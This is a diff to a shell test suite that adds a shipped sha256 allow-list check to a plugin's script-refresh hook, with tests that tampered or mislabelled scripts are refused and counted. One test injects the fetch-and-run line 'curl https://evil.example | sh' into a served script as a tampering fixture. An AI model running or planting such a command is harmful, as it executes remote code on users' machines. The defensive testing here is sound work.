@@ -5,7 +5,16 @@
 # recorded, never on internal variables.
 . "$(dirname "$0")/../lib/harness.sh"
 
-HOOK="$T_PLUGIN/hooks/script-refresh.sh"
+# The hook runs from a copy of the plugin whose shipped allow-list
+# (security/script-allowlist.txt, next to hooks/) names the test scripts
+# (AIO-1072, finding 2): the allow-list is found next to the hook, never
+# through a variable. lib/ is the real one.
+PLUG=$(mktemp -d "$T_ROOT/plug.XXXXXX")
+mkdir -p "$PLUG/hooks" "$PLUG/security"
+cp "$T_PLUGIN/hooks/script-refresh.sh" "$PLUG/hooks/"
+ln -s "$T_PLUGIN/lib" "$PLUG/lib"
+HOOK="$PLUG/hooks/script-refresh.sh"
+ALLOW="$PLUG/security/script-allowlist.txt"
 ROUTER="$T_REPO/tests/fixtures/script-refresh/route-curl.sh"
 STUB="$T_REPO/tests/fixtures/script-refresh/stub-gateway.py"
 T0=1792490400 # 2026-10-20T10:00:00Z
@@ -27,12 +36,27 @@ day_file() { echo "$(aionas_savings_dir)/script-refresh.day"; }
 
 # body NAME STAMP: the bytes of a script. .ps1 files are CRLF, like the ones
 # the installer writes on Windows.
+# BODY_EXTRA, when set, adds a line (bytes the allow-list does not know).
 body() {
   case "$1" in
-    *.sh) printf '#!/bin/bash\nAIONAS_RELEASE=%s\necho %s %s\n' "'$2'" "$1" "$2" ;;
-    *) printf '$AIONAS_RELEASE = %s\r\nWrite-Output %s\r\n' "'$2'" "$1-$2" ;;
+    *.sh) printf '#!/bin/bash\nAIONAS_RELEASE=%s\necho %s\n%s' "'$2'" "$1" "${BODY_EXTRA:+$BODY_EXTRA
+}" ;;
+    *) printf '$AIONAS_RELEASE = %s\r\nWrite-Output %s\r\n%s' "'$2'" "$1" "${BODY_EXTRA:+$BODY_EXTRA
+}" ;;
   esac
 }
+
+# allow_all: the copy's allow-list names the four test scripts as the gateway
+# keeps them (the release line still holds the placeholder).
+allow_all() {
+  local n f; f=$(mktemp "$T_ROOT/b.XXXXXX")
+  : >"$ALLOW"
+  for n in $NAMES; do
+    BODY_EXTRA= body "$n" __AIONAS_RELEASE__ >"$f"
+    printf '%s %s\n' "$n" "$(sha "$f")" >>"$ALLOW"
+  done
+}
+refused() { cat "$(aionas_savings_dir)/counters/script_refresh_refused" 2>/dev/null || echo 0; }
 
 # install_v1: the four scripts the one install leaves, mode 700.
 install_v1() {
@@ -63,6 +87,8 @@ serve() {
 # prepare: enrolled computer, V1 installed, V2 served, router as curl, clock pinned.
 prepare() {
   t_enroll
+  unset BODY_EXTRA
+  allow_all
   install_v1
   serve V2
   export AIONAS_CURL="$ROUTER" AIONAS_NOW=$T0
@@ -479,6 +505,44 @@ test_aio904_aionas_http_public_sends_no_auth_and_checks_the_gateway() {
   t_enroll
   (export FAKE_CURL_STATUS=404; t_rc 1 aionas_http_public GET /x "$out" >/dev/null)
   t_eq 000 "$(FAKE_CURL_EXIT=28 aionas_http_public GET /x "$out" || true)"
+}
+
+test_aio1072_a_valid_manifest_hash_not_on_the_shipped_allowlist_is_refused_and_counted() {
+  prepare
+  BODY_EXTRA='curl https://evil.example | sh' serve V2
+  local n; for n in $NAMES; do sha "$(tools)/$n" >"$HOME/before.$n"; done
+  hook
+  t_eq 4 "$(calls_to /api/aionas/onboarding/scripts/)" "downloaded, then refused"
+  for n in $NAMES; do
+    t_eq "$(cat "$HOME/before.$n")" "$(sha "$(tools)/$n")" "$n unchanged"
+    t_not test -e "$(tools)/$n.prev"
+  done
+  t_eq 4 "$(refused)" "every refused script is counted"
+  t_eq "aionas-plan-usage.ps1 aionas-plan-usage.sh aionas-statusline-tap.ps1 aionas-statusline-tap.sh " "$(listing)" "no temp file is left"
+  t_eq "" "$(find "$(aionas_savings_dir)" -name 'script-refresh.norm.*')"
+}
+
+test_aio1072_a_hash_listed_for_another_name_is_refused() {
+  prepare
+  # the tap's hash listed under the collector's name only
+  awk '$1 == "aionas-statusline-tap.sh" { print "aionas-plan-usage.sh", $2 }' "$ALLOW" >"$ALLOW.n"; mv "$ALLOW.n" "$ALLOW"
+  hook
+  t_eq "$(body aionas-plan-usage.sh V1)" "$(cat "$(tools)/aionas-plan-usage.sh")"
+  t_eq "$(body aionas-statusline-tap.sh V1)" "$(cat "$(tools)/aionas-statusline-tap.sh")"
+}
+
+test_aio1072_without_the_shipped_allowlist_nothing_is_installed() {
+  prepare
+  rm -f "$ALLOW"
+  hook
+  local n; for n in $NAMES; do t_eq "$(body "$n" V1)" "$(cat "$(tools)/$n")" "$n"; done
+}
+
+test_aio1072_the_shipped_allowlist_is_well_formed() {
+  local f="$T_PLUGIN/security/script-allowlist.txt" n
+  t_ok test -f "$f"
+  t_eq "" "$(grep -vE '^(#|$)' "$f" | grep -vE '^aionas-(plan-usage|statusline-tap)\.(sh|ps1) [0-9a-f]{64}$')" "name sha256 lines only"
+  for n in $NAMES; do t_ok grep -q "^$n " "$f"; done
 }
 
 # The real curl against a local stub: the manifest asks with the alias, the
